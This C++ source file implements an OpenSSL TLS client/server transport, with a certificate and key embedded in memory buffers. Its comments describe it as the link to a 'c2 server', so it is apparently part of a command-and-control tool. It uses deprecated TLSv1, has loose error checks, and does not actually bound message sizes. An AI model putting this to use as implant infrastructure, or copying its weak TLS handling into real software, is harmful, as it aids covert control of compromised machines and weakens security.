////////////////////////////////////////////////////////////////////////////////
// ssl.cc
// author: jcramb@gmail.com

#include "ssl.h"

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include <cstring>
#include <cstdio>

#include "core.h"
#include "cert.h"

#define SOCKET_BACKLOG 10

////////////////////////////////////////////////////////////////////////////////
// load SSL certificate / key from memory buffers and verify them

int ssl_load_cert_bufs(SSL_CTX * ctx, char * crt_buf, int crt_len,
                                      char * key_buf, int key_len) {


    // load certificate into openssl memory buffer
    BIO * cbio = BIO_new_mem_buf(crt_buf, -1);
    X509 * cert = PEM_read_bio_X509(cbio, NULL, 0, NULL);

    // load key into openssl memory buffer
    BIO * kbio = BIO_new_mem_buf(key_buf, -1);
    RSA * key = PEM_read_bio_RSAPrivateKey(kbio, NULL, 0, NULL);
    
    // perform verification
    if (SSL_CTX_use_certificate(ctx, cert) <= 0) {
        LOG("error: openssl failed to load certificate buffer\n"); 
        return -1;
    }
    if (SSL_CTX_use_RSAPrivateKey(ctx, key) <= 0) {
        LOG("error: openssl failed to load key buffer\n"); 
        return -1;
    }
    if (!SSL_CTX_check_private_key(ctx)) {
        LOG("error: private key does not match public certificate\n");
        return -1;
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// load SSL certificate / key files and verify them
// NOTE: this function isn't used since certs are loaded from memory buffers

int ssl_load_certs(SSL_CTX * ctx, char * cert_file, char * key_file) {

    // set local cert from certfile
    if (SSL_CTX_use_certificate_file(ctx, cert_file, SSL_FILETYPE_PEM) <= 0) {
        LOG("error: failed to load certificate file\n");
        return -1;
    }

    // set private key from keyfile (may be same as cert)
    if (SSL_CTX_use_PrivateKey_file(ctx, key_file, SSL_FILETYPE_PEM) <= 0) {
        LOG("error: failed to load key file\n");
        return -1; 
    }

    // verify private key
    if (!SSL_CTX_check_private_key(ctx)) {
        LOG("error: private key does not match public certificate\n");
        return -1;
    }

    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// debug function to print SSL certificate information

void ssl_dump_certs(SSL * ssl) {
    X509 * cert;
    char * line;

    // get server certificate
    cert = SSL_get_peer_certificate(ssl);
    if (cert != NULL) {

        // print cert subject
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        LOG("[subject]\n%s\n", line);
        free(line);

        // print cert issuer
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        LOG("[issuer]\n%s\n", line);
        free(line);
        X509_free(cert);

    } else {
        LOG("info: no certs to dump\n");
    }
}

////////////////////////////////////////////////////////////////////////////////
// ssl transport ctors / dtors

ssl_transport::ssl_transport() {
    m_ctx = NULL;
    m_ssl = NULL;
    m_opt_host = sock_get_ip();
    m_opt_port = 443;
}

ssl_transport::~ssl_transport() {
    this->close();
}

////////////////////////////////////////////////////////////////////////////////
// blocking function to create SSL transport connection

int ssl_transport::init(int type) {

    // fire up openssl
    SSL_library_init();
    SSL_METHOD * method;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // determine SSL method based on transport type
    if (type == TPT_CLIENT) {
        method = (SSL_METHOD*)TLSv1_client_method();
    } else if (type == TPT_SERVER) {
        method = (SSL_METHOD*)TLSv1_server_method();
    } else {
        LOG("error: invalid transport type\n");
        return -1;
    }

    // create SSL context
    m_ctx = SSL_CTX_new(method);
    if (m_ctx == NULL) {
        LOG("error: ssl failed to created new CTX\n");
        return -1;
    }

    // load SSL certificates from memory and verifies them 
    // NOTE: these buffers are generated by bin2cc.py 
    if (ssl_load_cert_bufs(m_ctx, _crtbuf, _crtbuf_len,
                                  _keybuf, _keybuf_len) < 0) {
        LOG("error: ssl failed to verify certificates\n");
        return -1;
    }
    LOG("info: SSL certificates verified\n");
        
    // create ssl session
    m_ssl = SSL_new(m_ctx);
    if (m_ssl == NULL) {
        LOG("error: ssl failed to create session\n");
        return -1;
    }

    // initialise connection based on whether we are the client or server
    int sock;
    if (type == TPT_CLIENT) {

        // if client, connect to c2 server
        if ((sock = m_tcp.connect(m_opt_host, m_opt_port)) < 0) {
            return -1;
        }

        // pass socket to openssl
        SSL_set_fd(m_ssl, sock);
        if (SSL_connect(m_ssl) < 0) {
            LOG("error: ssl connect failed\n");
            return -1;
        }

    } else if (type == TPT_SERVER) {

        // if server, bind to desired port and listen for connections
        LOG("info: c2 server at %s:%d\n", m_opt_host.c_str(), m_opt_port);
        if (m_tcp.bind(m_opt_port) < 0) {
            return -1;
        }

        // accept incoming connection
        LOG("info: waiting for client...\n");
        if ((sock = m_tcp.accept()) < 0) {
            return -1;
        }

        // pass client socket to openssl and accept the connection 
        SSL_set_fd(m_ssl, sock);
        if (SSL_accept(m_ssl) < 0) {
            LOG("error: ssl accept failed\n");
            return -1;
        }

    } else {
        LOG("error: invalid transport type\n");
        return -1;
    }
        
    // log ssl connection info / make socket non-blocking
    LOG("info: SSL connected using cipher (%s)\n", SSL_get_cipher(m_ssl)); 
    sock_set_blocking(sock, false);
    ssl_dump_certs(m_ssl);

    // success!
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// SSL implementation to send transport msg's 

int ssl_transport::send(message & msg) {

    // TODO: handle SSL_ERROR_WANT_READ
    //       handle SSL_ERROR_WANT_WRITE using SSL_get_error()
    // http://funcptr.net/2012/04/08/openssl-as-a-filter-%28or-non-blocking-openssl%29/

    int len = msg.data_len();
    int bytes_sent = 0;

    // send all data 
    while (bytes_sent < len) {
        int bytes = SSL_write(m_ssl, msg.data() + bytes_sent, len - bytes_sent);
        if (bytes == -1) {
            LOG("error: SSL transport failed to send message!\n");
            return -1;
        } else {
            bytes_sent += bytes;
        }
    }
    return bytes_sent;
}

////////////////////////////////////////////////////////////////////////////////
// SSL implementation to receive transport msg's

int ssl_transport::recv(message & msg) {

    // receive the message header first to determine size
    int bytes = SSL_read(m_ssl, msg.data(), msg.header_len); 
    if (bytes == 0) {
        return TPT_CLOSE;
    } else if (bytes < 0) {
        return TPT_EMPTY; // TODO: potential unreported errors here
    } 

    // enforce size constraint, in case of malicious msg sizes
    msg.resize(msg.body_len());
    bytes = SSL_read(m_ssl, msg.body(), msg.body_len());
    return bytes;
}

////////////////////////////////////////////////////////////////////////////////
// SSL implementation for handling transport options

void ssl_transport::setopt(int opt, std::string value) {
    switch (opt) {
        case SSL_OPT_HOST: m_opt_host = value; break;
        case SSL_OPT_PORT: m_opt_port = atoi(value.c_str()); break;
    }
}

////////////////////////////////////////////////////////////////////////////////
// tear down SSL connection

void ssl_transport::close() {

    // free openssl data structures
    if (m_ssl != NULL) {
        SSL_shutdown(m_ssl);
        SSL_free(m_ssl);
        m_ssl = NULL;
    }
    if (m_ctx != NULL) {
        SSL_CTX_free(m_ctx);
        m_ctx = NULL;
    } 
    
    // clean up tcp stream
    m_tcp.close();
}

////////////////////////////////////////////////////////////////////////////////
